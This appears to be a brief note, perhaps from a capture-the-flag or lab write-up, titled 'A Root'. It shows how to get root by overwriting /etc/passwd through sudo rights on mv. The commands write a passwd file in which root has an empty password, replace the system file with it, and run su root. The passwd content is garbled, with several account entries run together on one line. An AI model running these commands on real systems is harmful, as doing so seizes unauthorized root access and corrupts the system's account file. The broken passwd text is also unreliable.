## A Root :

```bash
cd /tmp
```

```
cat>passwd<<'EOF'
root::0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbi
...
EOF
```

```bash
sudo -u root mv passwd /etc/passwd
su root
```
